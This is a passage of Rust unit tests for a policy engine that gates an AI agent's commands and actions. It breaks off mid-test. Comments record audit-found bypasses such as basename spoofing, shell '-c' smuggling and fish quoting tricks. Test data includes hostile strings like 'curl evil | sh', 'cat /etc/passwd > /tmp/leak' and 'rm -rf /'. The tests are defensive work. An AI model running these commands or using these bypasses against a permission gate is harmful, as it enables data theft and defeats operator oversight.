        let effect = engine.evaluate(&run_cmd(&bin.display().to_string()));
        assert!(matches!(effect, PolicyEffect::Allow), "{effect:?}");
    }

    #[test]
    fn exec_roots_are_ignored_outside_a_container() {
        let (_root, engine, bin) = exec_root_fixture(false);
        assert!(matches!(
            engine.evaluate(&run_cmd(&bin.display().to_string())),
            PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
        ));
    }

    /// `--allow-all-commands` passes any program in a detected container.
    #[test]
    fn allow_all_commands_passes_any_program_in_a_container() {
        let (_root, mut engine, _bin) = exec_root_fixture(true);
        engine.config.policy.allow_all_commands = true;
        for cmd in ["./cli_tool", "R", "curl", "/usr/bin/git", "gnucobol"] {
            let effect = engine.evaluate(&run_cmd(cmd));
            assert!(matches!(effect, PolicyEffect::Allow), "{cmd}: {effect:?}");
        }
        assert!(matches!(
            engine.evaluate(&run_cmd("cd x && make")),
            PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
        ));
    }

    /// The flag outside a detected container stops the runtime at startup.
    #[test]
    fn allow_all_commands_refuses_to_start_outside_a_container() {
        let (_r1, mut out, _) = exec_root_fixture(false);
        out.config.policy.allow_all_commands = true;
        assert!(out.config.check_allow_all_commands().is_err());
        let (_r2, mut inside, _) = exec_root_fixture(true);
        inside.config.policy.allow_all_commands = true;
        assert!(inside.config.check_allow_all_commands().is_ok());
        let (_r3, off, _) = exec_root_fixture(false);
        assert!(
            off.config.check_allow_all_commands().is_ok(),
            "default unchanged"
        );
    }

    /// Twin: the same flag outside a detected container changes nothing.
    #[test]
    fn allow_all_commands_is_ignored_outside_a_container() {
        let (_root, mut engine, _bin) = exec_root_fixture(false);
        engine.config.policy.allow_all_commands = true;
        assert!(matches!(
            engine.evaluate(&run_cmd("./cli_tool")),
            PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
        ));
    }

    #[test]
    fn exec_roots_refuse_escapes_and_relative_paths() {
        let (root, engine, bin) = exec_root_fixture(true);
        let outside = root.path().join("evil");
        std::fs::write(&outside, "").unwrap();
        let link = root.path().join("work/link");
        std::os::unix::fs::symlink(&outside, &link).unwrap();
        for cmd in [
            format!("{}/work/../evil", root.path().display()),
            outside.display().to_string(),
            link.display().to_string(),
            "work/mini-nmap/target/release/mini-nmap".to_string(),
            "mini-nmap".to_string(),
            format!("{}/work/missing", root.path().display()),
        ] {
            assert!(
                matches!(
                    engine.evaluate(&run_cmd(&cmd)),
                    PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
                ),
                "{cmd} must stay denied"
            );
        }
        let _ = bin;
    }

    /// SECURITY regression (August 2026 audit, finding 7). The allowlist check
    /// accepted `Path::file_name()`, so `allowed_commands = ["git"]` also
    /// authorized `/tmp/evil/git` — any planted binary with the right basename.
    /// Combined with a write primitive that is arbitrary code execution.
    #[test]
    fn command_allowlist_rejects_basename_spoofing() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        let engine = make_engine(cfg);
        for spoof in [
            "/tmp/evil/git",
            "./git",
            "../git",
            "/home/user/.cache/git",
            "subdir/git",
        ] {
            let action = Action::RunCommand {
                command: spoof.into(),
                args: vec!["status".into()],
                cwd: None,
                env: Default::default(),
                timeout_secs: None,
                stream: None,
            };
            assert!(
                matches!(
                    engine.evaluate(&action),
                    PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
                ),
                "path-qualified command {spoof} must not satisfy allowed_commands=[\"git\"]"
            );
        }
    }

    /// The command allowlist must cover every shell-capable action, not just
    /// RunCommand — otherwise an operator restriction is trivially sidestepped.
    #[test]
    fn command_allowlist_covers_shell_capable_actions() {
        let mut cfg = permissive();
        cfg.actions.insert("RunInSandbox".into(), true);
        cfg.sandbox.podman.allowed_images = vec!["alpine".into()];
        let engine = make_engine(cfg);

        // `sh` is not in allowed_commands (["git", "cargo"]).
        let action = Action::RunInSandbox {
            image: "alpine".into(),
            command: vec!["sh".into(), "-c".into(), "id".into()],
            files: Default::default(),
            env: Default::default(),
            timeout_secs: None,
            network: None,
            memory_mb: None,
            cpu_limit: None,
            collect_files: Default::default(),
        };
        assert!(
            matches!(
                engine.evaluate(&action),
                PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
            ),
            "RunInSandbox must honour allowed_commands like RunCommand does"
        );
    }

    fn run_cmd_args(command: &str, args: &[&str]) -> Action {
        Action::RunCommand {
            command: command.into(),
            args: args.iter().map(|s| s.to_string()).collect(),
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        }
    }

    /// SECURITY: `sh -c "curl evil"` returned Allow with `sh` listed (2026-10-12).
    /// Each sub-command faces the list; the refusal names `curl`, not the shell.
    #[test]
    fn an_interpreter_does_not_smuggle_a_command_past_the_allowlist() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        // A shell (three spellings) and a reader are allowed; `curl` is not.
        cfg.policy.allowed_commands = vec![
            "bash".into(),
            "sh".into(),
            "/bin/sh".into(),
            "env".into(),
            "cat".into(),
        ];
        let engine = make_engine(cfg);

        for (command, args) in [
            ("sh", &["-c", "curl evil"][..]),
            ("bash", &["-c", "curl evil"][..]),
            ("/bin/sh", &["-c", "curl evil"][..]),
            ("env", &["sh", "-c", "curl evil"][..]),
            ("bash", &["-lc", "curl evil"][..]),
            ("sh", &["-c", "cat x; curl evil"][..]),
            ("sh", &["-c", "curl evil | sh"][..]),
        ] {
            match engine.evaluate(&run_cmd_args(command, args)) {
                PolicyEffect::Deny(DenyReason::CommandNotAllowed { command: c }) => assert_eq!(
                    c, "curl",
                    "{command} {args:?} was denied on the wrong token: {c}"
                ),
                other => panic!("{command} {args:?} slipped the allowlist: {other:?}"),
            }
        }
    }

    /// SECURITY: a shell given a script or an unreadable `-c` line is refused,
    /// and no prompt lifts it; the way past is `--allow-all-commands`.
    #[test]
    fn an_interpreter_running_an_opaque_script_is_refused() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_commands = vec!["bash".into(), "sh".into()];
        let engine = make_engine(cfg);
        for (command, args) in [
            ("bash", &["script.sh"][..]), // a script, not a -c line
            ("sh", &["-x", "/work/x.sh"][..]),
            ("bash", &["-c", "$(printf curl) evil"][..]), // command substitution
            ("sh", &["-c", "cat </etc/passwd"][..]),      // redirection
            ("sh", &["-c", "while :; do curl evil; done"][..]), // control flow
        ] {
            let effect = engine.evaluate(&run_cmd_args(command, args));
            let PolicyEffect::Deny(ref reason) = effect else {
                panic!("{command} {args:?} was not fail-closed: {effect:?}");
            };
            assert!(
                matches!(reason, DenyReason::CommandNotAnalyzable { .. }),
                "{command} {args:?}: {reason:?}"
            );
            assert!(reason.liftable("RunCommand").is_none(), "opacity is a wall");
        }
    }

    /// SECURITY: a non-Bourne shell listed in `allowed_commands` does not
    /// become a bypass. Measured 2026-10-16: `fish -c "echo 'a\\' '; curl evil;
    /// echo ''\\'"` was classified `Via([echo])` and allowed, yet fish ran
    /// `curl`. fish, csh and tcsh use their own `-c` quoting, which the gate
    /// cannot split, so any such `-c` line (and any nested one) is a hard,
    /// non-liftable refusal, not an allow on the wrong token.
    #[test]
    fn a_foreign_shell_dash_c_is_a_wall() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_commands = vec![
            "fish".into(),
            "csh".into(),
            "tcsh".into(),
            "sh".into(),
            "echo".into(),
        ];
        let engine = make_engine(cfg);
        for (command, args) in [
            ("fish", &["-c", "echo 'a\\' '; curl evil; echo ''\\'"][..]),
            ("fish", &["-c", "echo hi"][..]),
            ("csh", &["-c", "cat f; curl evil"][..]),
            ("tcsh", &["-c", "cat f; curl evil"][..]),
            ("sh", &["-c", "fish -c 'curl evil'"][..]), // nested foreign shell
        ] {
            let effect = engine.evaluate(&run_cmd_args(command, args));
            let PolicyEffect::Deny(ref reason) = effect else {
                panic!("{command} {args:?} was not fail-closed: {effect:?}");
            };
            assert!(
                matches!(reason, DenyReason::CommandNotAnalyzable { .. }),
                "{command} {args:?}: {reason:?}"
            );
            assert!(
                reason.liftable("RunCommand").is_none(),
                "a foreign shell -c is a wall, not a prompt"
            );
        }
        // A bare foreign shell is inert, so listing it still lets it open.
        assert_eq!(
            engine.evaluate(&run_cmd_args("fish", &[])),
            PolicyEffect::Allow,
            "a bare fish is inert and should pass"
        );
    }

    /// An allowlisted interpreter running only allowlisted sub-commands still
    /// works: the fix closes the bypass, it does not forbid shells outright.
    #[test]
    fn an_interpreter_running_allowed_commands_passes() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_commands = vec!["bash".into(), "sh".into(), "cat".into(), "echo".into()];
        let engine = make_engine(cfg);
        for (command, args) in [
            ("bash", &["-c", "cat f; echo done"][..]),
            ("sh", &["-c", "echo 'a; b'"][..]), // `;` inside quotes is literal
            ("sh", &[][..]),                    // a bare shell is inert
        ] {
            assert_eq!(
                engine.evaluate(&run_cmd_args(command, args)),
                PolicyEffect::Allow,
                "{command} {args:?} should pass"
            );
        }
    }

    /// SECURITY: the allowlist rules on the whole `ArtifactServe` command line,
    /// never on its first token alone.
    ///
    /// Measured 2026-08-15: with `allowed_commands = ["python3"]`, the line
    /// `python3 --version ; cat /etc/passwd > /tmp/leak` was gated on `python3`
    /// and ran all three commands — `cat` was in no allowlist, `/etc/passwd`
    /// under no read root, and the destination under no write root.
    ///
    /// A failure here means naming one allowed program again licenses
    /// everything after the first separator.
    #[test]
    fn the_policy_sees_the_whole_command_line_not_its_first_token() {
        let mut cfg = permissive();
        cfg.actions.insert("ArtifactServe".into(), true);
        cfg.policy.allowed_commands = vec!["python3".into()];
        let engine = make_engine(cfg);

        let serve = |command: &str| Action::ArtifactServe {
            id: "cv_1".into(),
            command: command.into(),
            port: None,
            env: Default::default(),
        };

        // The bare program is allowed — this is the case the allowlist is for.
        assert_eq!(
            engine.evaluate(&serve("python3 -m http.server $PORT")),
            PolicyEffect::Allow,
            "an allowlisted program must still be servable"
        );

        for hostile in [
            "python3 --version ; cat /etc/passwd > /tmp/leak",
            "python3 --version && rm -rf /tmp/x",
            "python3 -m http.server $(id -un)",
            "python3 | tee /tmp/leak",
        ] {
            match engine.evaluate(&serve(hostile)) {
                PolicyEffect::Deny(DenyReason::CommandNotAllowed { command }) => {
                    // Not merely denied: denied FOR THE WHOLE LINE. A denial
                    // naming `python3` would be the old first-token reading
                    // returning the opposite verdict by accident, and would
                    // flip back the moment the operator allowlisted `python3`
                    // — which this config already does.
                    assert_eq!(
                        command, hostile,
                        "the gate ruled on a fragment, not on the line"
                    );
                }
                other => panic!("a shell line passed the gate: {hostile:?} → {other:?}"),
            }
        }
    }

    /// SECURITY: `ArtifactServe` is a modifying action for the runtime's two
    /// system-wide modes — refused in `readonly`, confirmed in `confirm`.
    ///
    /// It qualifies through `is_write_action`, which is the only list it
    /// appears in (`is_run_command` does not name it). Nothing pinned that
    /// membership: removing the variant from `is_write_action` left the whole
    /// policy suite green while making a detached, port-binding process legal
    /// in `readonly` mode — measured while mutating, 2026-08-15, and this test
    /// is the answer to it.
    ///
    /// A failure here means an operator who asked for readonly gets a service.
    #[test]
    fn serving_an_artifact_is_a_modifying_action_in_both_runtime_modes() {
        let serve = Action::ArtifactServe {
            id: "cv_1".into(),
            command: "python3 -m http.server $PORT".into(),
            port: None,
            env: Default::default(),
        };

        let mut readonly = permissive();
        readonly.policy.mode = "readonly".into();
        readonly.actions.insert("ArtifactServe".into(), true);
        assert!(
            matches!(
                make_engine(readonly).evaluate(&serve),
                PolicyEffect::Deny(DenyReason::ReadonlyMode)
            ),
            "readonly mode let a service start"
        );

        let mut confirm = permissive();
        confirm.policy.mode = "confirm".into();
        confirm.actions.insert("ArtifactServe".into(), true);
        assert!(
            matches!(
                make_engine(confirm).evaluate(&serve),
                PolicyEffect::RequireConfirmation(_)
            ),
            "confirm mode started a service without asking"
        );
    }

    /// The `$PORT` placeholder is not yet substituted when the gate runs, and it
    /// must not be mistaken for the shell syntax the gate refuses. Pinned
    /// because the obvious "refuse every `$`" implementation would deny every
    /// legitimate serve command, and the fix for that would be to stop calling
    /// the shared parser here — putting the two readings back.
    #[test]
    fn the_port_placeholder_does_not_trip_the_gate() {
        let mut cfg = permissive();
        cfg.actions.insert("ArtifactServe".into(), true);
        cfg.policy.allowed_commands = vec!["python3".into()];
        let engine = make_engine(cfg);
        assert_eq!(
            engine.evaluate(&Action::ArtifactServe {
                id: "cv_1".into(),
                command: "python3 -m http.server $PORT --bind 127.0.0.1".into(),
                port: None,
                env: Default::default(),
            }),
            PolicyEffect::Allow
        );
    }

    #[test]
    fn allow_whitelisted_command() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        let engine = make_engine(cfg);
        let action = Action::RunCommand {
            command: "git".into(),
            args: vec!["status".into()],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        };
        assert_eq!(engine.evaluate(&action), PolicyEffect::Allow);
    }

    #[test]
    fn pipeline_allows_nested_pipeline() {
        let mut cfg = permissive();
        cfg.actions.insert("Pipeline".into(), true);
        let engine = make_engine(cfg);
        let inner = Action::Pipeline {
            steps: vec![],
            stop_on_error: true,
            snapshot_before: None,
            parallel: false,
        };
        let outer = Action::Pipeline {
            steps: vec![inner],
            stop_on_error: true,
            snapshot_before: None,
            parallel: false,
        };
        // Nesting is now allowed at the policy level (depth is enforced at execution time)
        assert_eq!(engine.evaluate(&outer), PolicyEffect::Allow);
    }

    #[test]
    fn pipeline_policy_preflight_rejects_step() {
        let mut cfg = permissive();
        cfg.actions.insert("Pipeline".into(), true);
        cfg.actions.insert("WriteFile".into(), false);
        let engine = make_engine(cfg);
        let pipeline = Action::Pipeline {
            steps: vec![
                Action::ReadFile {
                    path: "/tmp/a".into(),
                    offset: 0,
                    limit: None,
                    start_line: None,
                    limit_lines: None,
                },
                Action::WriteFile {
                    path: "/tmp/b".into(),
                    content: "x".into(),
                },
            ],
            stop_on_error: true,
            snapshot_before: None,
            parallel: false,
        };
        assert!(matches!(
            engine.evaluate(&pipeline),
            PolicyEffect::Deny(DenyReason::PipelineStepDenied { step: 1, .. })
        ));
    }

    #[test]
    fn desktop_disabled_blocks_all() {
        let mut cfg = permissive();
        cfg.desktop.enabled = false;
        let engine = make_engine(cfg);
        let action = Action::Screenshot {
            output: None,
            region: None,
        };
        assert!(matches!(
            engine.evaluate(&action),
            PolicyEffect::Deny(DenyReason::DesktopDisabled)
        ));
    }

    // GetEnv whitelist tests removed with the variant in v0.3.

    #[test]
    fn meta_actions_always_allowed() {
        let mut cfg = permissive();
        // Even when action map has them disabled
        cfg.actions.insert("PolicyCheck".into(), false);
        let engine = make_engine(cfg);
        let safe = Action::PolicyCheck {
            action: serde_json::json!({"type":"ReadFile","path":"/tmp/x"}),
        };
        assert_eq!(engine.evaluate(&safe), PolicyEffect::Allow);
        assert_eq!(engine.evaluate(&Action::ListHandles), PolicyEffect::Allow);
        assert_eq!(
            engine.evaluate(&Action::CheckHandle { handle: "x".into() }),
            PolicyEffect::Allow
        );
    }

    /// Regression for audit finding 9: actions that touch the filesystem or
    /// the network must never fall through to `Meta`. `Meta` is treated as
    /// inert by `Simulate`, so a misclassified action makes the flagship
    /// "what would happen?" primitive under-report real side effects.
    #[test]
    fn side_effect_classification_has_no_inert_fallthrough() {
        let engine = make_engine(permissive());

        let doc = Action::DocumentExtract {
            input: "/tmp/in.pdf".into(),
            output: "/tmp/out.txt".into(),
            format: "raw".into(),
            llm_endpoint: None,
            llm_model: None,
            chunk_size: None,
        };
        assert_ne!(
            engine.classify(&doc),
            SideEffectClass::Meta,
            "DocumentExtract spawns extractors and writes files; must not be Meta"
        );

        let ds = Action::DatasetGenerate {
            endpoint: "http://localhost:11434".into(),
            model: "llama3.2".into(),
            topic: "rust".into(),
            count: 10,
            output: "/tmp/ds.jsonl".into(),
            style: None,
        };
        assert_ne!(
            engine.classify(&ds),
            SideEffectClass::Meta,
            "DatasetGenerate calls an LLM endpoint and writes a file; must not be Meta"
        );

        let ws = Action::WebSearch {
            query: "rust".into(),
            limit: 5,
        };
        assert_eq!(
            engine.classify(&ws),
            SideEffectClass::Network,
            "WebSearch performs outbound HTTP"
        );
    }

    #[test]
    fn readonly_mode_blocks_writes() {
        let mut cfg = permissive();
        cfg.policy.mode = "readonly".into();
        let engine = make_engine(cfg);

        let write_action = Action::WriteFile {
            path: "/tmp/a".into(),
            content: "x".into(),
        };
        assert!(matches!(
            engine.evaluate(&write_action),
            PolicyEffect::Deny(DenyReason::ReadonlyMode)
        ));

        let run_action = Action::RunCommand {
            command: "ls".into(),
            args: vec![],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        };
        assert!(matches!(
            engine.evaluate(&run_action),
            PolicyEffect::Deny(DenyReason::ReadonlyMode)
        ));

        let read_action = Action::ReadFile {
            path: "/tmp/a".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        assert_eq!(engine.evaluate(&read_action), PolicyEffect::Allow);
    }

    #[test]
    fn confirm_mode_prompts_writes() {
        let mut cfg = permissive();
        cfg.policy.mode = "confirm".into();
        let engine = make_engine(cfg);

        let write_action = Action::WriteFile {
            path: "/tmp/a".into(),
            content: "x".into(),
        };
        assert!(matches!(
            engine.evaluate(&write_action),
            PolicyEffect::RequireConfirmation(_)
        ));

        let run_action = Action::RunCommand {
            command: "ls".into(),
            args: vec![],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        };
        assert!(matches!(
            engine.evaluate(&run_action),
            PolicyEffect::RequireConfirmation(_)
        ));

        // Read action is still fully allowed without confirm
        let read_action = Action::ReadFile {
            path: "/tmp/a".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        assert_eq!(engine.evaluate(&read_action), PolicyEffect::Allow);
    }

    // ── asm-ai: the gate takes over again ────────────────────────────────────

    /// SECURITY: `ALWAYS_ALLOW` is not « a harmless action », it is an
    /// exemption from the **entire** gate: the per-action switch, the
    /// `readonly`/`confirm` modes, the path checks. The code order says so —
    /// the list is consulted first (`policy.rs:140-142`), before the desktop
    /// gate, before the modes, before the switch. `CallFunction` was there
    /// because Rhai has no capability (`scripted.rs:26-30`). asm-ai is designed
    /// to break exactly that premise — the exemption goes **before** a
    /// capability tier exists, not after.
    ///
    /// A failure here means that an action executing stored code bypasses the
    /// entire policy.
    #[test]
    fn calling_a_stored_function_is_no_longer_exempt_from_the_whole_gate() {
        assert!(
            !ALWAYS_ALLOW.contains(&"CallFunction"),
            "CallFunction must go through the gate like everything else"
        );

        // And with the exemption gone, the switch takes over again.
        let mut cfg = AppConfig::defaults();
        cfg.policy.default_effect = "deny".into();
        let mut enabled = HashMap::new();
        enabled.insert("CallFunction".to_string(), false);
        let engine = PolicyEngine::new(cfg, enabled);
        let verdict = engine.evaluate(&Action::CallFunction {
            name: "slugify".into(),
            args: vec![],
        });
        assert!(
            matches!(verdict, PolicyEffect::Deny(DenyReason::ActionDisabled)),
            "got {verdict:?}"
        );
    }

    /// SECURITY: **this is the test that justifies the « separate action »
    /// decision.**
    ///
    /// The preview reads files. It is not gated — there is nothing to
    /// approve — but the operator must be able to turn it off, and turn it off
    /// *separately from the commit*. The two halves:
    ///
    /// 1. `[actions] PreviewProgram = false` refuses it, while `RunProgram`
    ///    stays allowed. This is the per-action switch (`policy.rs:165-172`),
    ///    and it only applies to **named** actions: a preview carried by
    ///    `Simulate` would have bypassed it, since `Simulate` is in
    ///    `ALWAYS_ALLOW`.
    /// 2. `mode = "readonly"` refuses the commit and **lets the preview
    ///    through**. `is_write_action` (:592-609) does not contain
    ///    `PreviewProgram`, so `is_modifying` (:151) is false for it. In
    ///    read-only mode, one can still see what a program would do — that is
    ///    the property, not a side effect.
    ///
    /// A failure on half 1 means the preview has become non-switchable again.
    /// A failure on half 2 means either that a read-only mode allows
    /// committing, or that it forbids looking.
    #[test]
    fn previewing_a_program_is_switchable_on_its_own_and_survives_readonly_mode() {
        let preview = Action::PreviewProgram {
            source: "#!asm-ai/v0\ncount files\n".into(),
        };
        let run = Action::RunProgram {
            source: "#!asm-ai/v0\ncount files\n".into(),
        };
        assert!(!ALWAYS_ALLOW.contains(&"PreviewProgram"));
        assert!(!ALWAYS_ALLOW.contains(&"RunProgram"));

        // ── Half 1: the switch, independently of the commit ──────────────────────
        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = "auto".into(); // isolates the switch from the modes
        let mut enabled = cfg.actions.clone();
        enabled.insert("PreviewProgram".to_string(), false);
        enabled.insert("RunProgram".to_string(), true);
        let engine = PolicyEngine::new(cfg, enabled);
        assert!(
            matches!(
                engine.evaluate(&preview),
                PolicyEffect::Deny(DenyReason::ActionDisabled)
            ),
            "the operator must be able to turn off preview alone"
        );
        assert!(
            matches!(engine.evaluate(&run), PolicyEffect::Allow),
            "…without affecting commit"
        );

        // ── Half 2: read-only mode ───────────────────────────────────────────────
        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = "readonly".into();
        let mut enabled = cfg.actions.clone();
        enabled.insert("PreviewProgram".to_string(), true);
        enabled.insert("RunProgram".to_string(), true);
        let engine = PolicyEngine::new(cfg, enabled);
        assert!(
            matches!(
                engine.evaluate(&run),
                PolicyEffect::Deny(DenyReason::ReadonlyMode)
            ),
            "a commit is a write, readonly refuses it"
        );
        assert!(
            matches!(engine.evaluate(&preview), PolicyEffect::Allow),
            "seeing what a program would do writes nothing"
        );
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  ALWAYS_ALLOW — the total exemption, and what is allowed to enter it
    // ═══════════════════════════════════════════════════════════════════════

    /// `SendInput` writes to the stdin of a LIVE process
    /// (`executor/interactive.rs:14`). While it was in `ALWAYS_ALLOW` it
    /// short-circuited the `[actions]` switch, the `readonly` / `confirm`
    /// modes and `default_effect = "deny"`: a `RunCommand {stream: true}`
    /// approved once became a permanent execution channel that the operator
    /// could no longer close.
    ///
    /// A failure here means that channel is reopened.
    #[test]
    fn send_input_is_never_always_allowed() {
        assert!(
            !ALWAYS_ALLOW.contains(&"SendInput"),
            "SendInput drives a live process: a full exemption takes away \
             the operator's switch"
        );
    }

    /// The guard against the next `SendInput`.
    ///
    /// `ALWAYS_ALLOW` exempts from the ENTIRE gate (`evaluate_with_config`,
    /// first check of the function). The comment above the constant states
    /// the criterion — « only what has strictly no capability may enter it » —
    /// but nothing checked it, and `SendInput` lived there for months
    /// classified `Meta` while it writes to a process's stdin.
    ///
    /// This test does two things, and both matter:
    ///
    /// 1. each entry's class must be inert (`ReadOnly`, `Meta`, or
    ///    `Composite` for `Simulate` alone, which projects its target without
    ///    ever executing it);
    /// 2. the list must be **exactly** the one justified below. Point 1
    ///    alone would not have caught `SendInput`: its class *was* the lie.
    ///    Adding a name therefore forces writing here why it has no
    ///    capability, which is the moment one notices.
    ///
    /// A failure means an action obtained the total exemption without anyone
    /// having argued it is harmless.
    #[test]
    fn every_always_allow_entry_has_no_capability() {
        /// Name, then the reason it has strictly no capability.
        const JUSTIFIED: &[(&str, &str)] = &[
            (
                "PolicyCheck",
                "projects an action onto the policy, executes nothing",
            ),
            ("Simulate", "previews, executes no step"),
            ("CheckHandle", "drains an in-process memory buffer"),
            ("ListHandles", "introspection of the in-memory registry"),
            (
                "ListCustomPrimitives",
                "introspection of the composite store",
            ),
            ("ListFunctions", "introspection of the function store"),
        ];

        let justified: std::collections::HashSet<&str> =
            JUSTIFIED.iter().map(|(n, _)| *n).collect();
        let allowed: std::collections::HashSet<&str> = ALWAYS_ALLOW.iter().copied().collect();
        assert_eq!(
            allowed, justified,
            "ALWAYS_ALLOW changed without the justification following — each entry \
             exempts from the WHOLE gate, so each is justified here"
        );

        for name in ALWAYS_ALLOW {
            let meta = x0ne_actions::action_meta(name)
                .unwrap_or_else(|| panic!("{name} is not an action of this runtime"));
            assert!(
                matches!(meta.class, "ReadOnly" | "Meta" | "Composite"),
                "{name} is of class {} and yet exempt from the whole gate",
                meta.class
            );
        }
    }

    /// The operator's switch must be effective **as loaded**, not as one
    /// imagines it. The test goes through `AppConfig::load` on a real file —
    /// the exact difference that let the three wizard profiles through:
    /// a test that *parses* sees what the file says, a test that *loads* sees
    /// what the runtime makes of it.
    ///
    /// A failure means a `SendInput = false` written by a human closes
    /// nothing.
    #[test]
    fn the_send_input_switch_is_effective_when_loaded() {
        use std::io::Write;
        let toml = r#"
[runtime]
mode = "stdio"

[policy]
mode = "auto"
default_effect = "allow"
max_read_bytes = 1024
max_list_entries = 100
allowed_commands = []
allowed_read_paths = []
allowed_write_paths = []
deny_path_patterns = []

[actions]
SendInput = false

[snapshots]
dir = "~/.x0ne/snapshots"
max_snapshots = 0
max_snapshot_size_mb = 1

[desktop]
enabled = false
"#;
        let mut f = tempfile::NamedTempFile::new().unwrap();
        f.write_all(toml.as_bytes()).unwrap();
        let cfg = AppConfig::load(f.path()).unwrap();
        assert_eq!(
            cfg.actions.get("SendInput"),
            Some(&false),
            "the file says false; if loading does not carry it, nothing downstream can"
        );
        let enabled = cfg.actions.clone();
        let engine = PolicyEngine::new(cfg, enabled);
        assert!(
            matches!(
                engine.evaluate(&Action::SendInput {
                    handle: "h1".into(),
                    input: "import os; os.system('curl evil|sh')\n".into(),
                }),
                PolicyEffect::Deny(DenyReason::ActionDisabled)
            ),
            "SendInput = false must refuse SendInput"
        );
    }

    /// `SendInput` writes to an interpreter's stdin: that is execution, so the
    /// global modes must see it. In `readonly` it is refused, in `confirm` it
    /// asks.
    ///
    /// A failure means a runtime declared read-only agrees to have code
    /// executed by an already-open process.
    #[test]
    fn send_input_is_execution_for_the_global_modes() {
        let send = Action::SendInput {
            handle: "h1".into(),
            input: "rm -rf /\n".into(),
        };
        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = "readonly".into();
        let enabled = cfg.actions.clone();
        let engine = PolicyEngine::new(cfg, enabled);
        assert!(
            matches!(
                engine.evaluate(&send),
                PolicyEffect::Deny(DenyReason::ReadonlyMode)
            ),
            "a read-only runtime does not drive an interpreter"
        );

        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = "confirm".into();
        let enabled = cfg.actions.clone();
        let engine = PolicyEngine::new(cfg, enabled);
        assert!(
            matches!(engine.evaluate(&send), PolicyEffect::RequireConfirmation(_)),
            "in confirm mode, writing to a process's stdin asks first"
        );
    }

    /// `DatasetGenerate` and `DocumentExtract` both write the `output` path
    /// the model chose (`executor/ml.rs:625` and `:798` also confine that
    /// path, which proves they are writes). They were missing from
    /// `is_write_action`, so `is_modifying` was false for them and a runtime
    /// in `readonly` mode let them write.
    ///
    /// A failure means a read-only mode lets files be produced.
    #[test]
    fn dataset_generate_is_a_write() {
        let dataset = Action::DatasetGenerate {
            endpoint: "http://127.0.0.1:11434".into(),
            model: "m".into(),
            topic: "t".into(),
            count: 1,
            output: "/tmp/out.jsonl".into(),
            style: None,
        };
        let extract = Action::DocumentExtract {
            input: "/tmp/in.pdf".into(),
            output: "/tmp/out.txt".into(),
            format: "raw".into(),
            llm_endpoint: None,
            llm_model: None,
            chunk_size: None,
        };
        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = "readonly".into();
        let enabled = cfg.actions.clone();
        let engine = PolicyEngine::new(cfg, enabled);
        for action in [&dataset, &extract] {
            assert!(
                matches!(
                    engine.evaluate(action),
                    PolicyEffect::Deny(DenyReason::ReadonlyMode)
                ),
                "{} writes its `output`: readonly must refuse it",
                action.type_name()
            );
        }
    }
}

// ── The session gate: which refusals are a decision, and which are a wall ────

#[cfg(test)]
mod liftable_reasons {
    use super::*;
    use crate::config::AppConfig;
    use x0ne_actions::policy_grant::{GrantKind, PolicyGrant};

    /// Actions are built from JSON here on purpose: the shape a model emits
    /// is the shape under test, and a struct literal would drift from it.
    fn act(v: serde_json::Value) -> Action {
        serde_json::from_value(v).expect("test action does not deserialize")
    }

    fn engine_with(mutate: impl FnOnce(&mut AppConfig)) -> PolicyEngine {
        let mut cfg = AppConfig::defaults();
        cfg.runtime.mode = "stdio".into();
        cfg.policy.mode = "auto".into();
        cfg.policy.default_effect = "allow".into();
        // `AppConfig::defaults()` is fail-closed: write and exec actions are
        // `false`. These tests are about the LISTS, so the switches are turned
        // on first and each test disables again what it means to measure.
        for a in ["ReadFile", "WriteFile", "RunCommand", "DeleteSnapshot"] {
            cfg.actions.insert(a.to_string(), true);
        }
        mutate(&mut cfg);
        let actions = cfg.actions.clone();
        PolicyEngine::new(cfg, actions)
    }

    /// A read grant lifts the refusal the executor raises, not only the one
    /// the gate raises.
    ///
    /// Field report 2026-08-16: the grant was journalled and the ReadFile
    /// failed 0.1 ms later with "no read paths are configured", because the
    /// gate read `SessionGrants` and the executor read the config from disk.
    /// A failure here means a refusal after a yes — the shape invariant 2 of
    /// docs/invariants.md exists to prevent — has come back through the executor.
    #[test]
    fn a_read_grant_lifts_the_empty_list_refusal() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("note.txt");
        std::fs::write(&file, b"x").unwrap();

        // The operator's file grants nothing: exactly the shape that produced
        // "no read paths are configured".
        let p = engine_with(|c| {
            c.policy.allowed_read_paths = vec![];
            c.policy.allowed_write_paths = vec![];
        });
        let base = p.config.clone();
        assert!(
            crate::executor::confine::resolve_read(&file.to_string_lossy(), &base.policy).is_err(),
            "the premise is wrong: the read was already allowed"
        );

        p.apply_grant(&PolicyGrant {
            kind: GrantKind::ReadPath,
            value: dir.path().to_string_lossy().to_string(),
            persist: false,
        })
        .expect("the grant was refused");

        let effective = p
            .config_with_session_grants(&base)
            .expect("a granted root produced no widened config");
        crate::executor::confine::resolve_read(&file.to_string_lossy(), &effective.policy)
            .expect("the executor still refuses a path the operator granted");

        // And nothing else moved: the write side was not granted.
        assert!(
